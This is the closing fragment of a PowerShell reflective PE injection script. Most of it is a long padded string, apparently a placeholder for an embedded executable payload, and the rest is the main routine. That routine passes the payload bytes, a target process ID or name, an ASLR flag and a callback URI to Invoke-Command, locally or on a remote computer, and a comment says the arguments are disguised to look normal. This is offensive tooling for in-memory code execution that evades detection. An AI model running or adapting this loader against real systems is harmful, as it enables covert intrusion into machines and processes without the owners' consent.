AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}
	
	[System.IO.Directory]::SetCurrentDirectory($pwd)

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $CallbackURI)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $CallbackURI) -ComputerName $ComputerName
	}
}

Main
}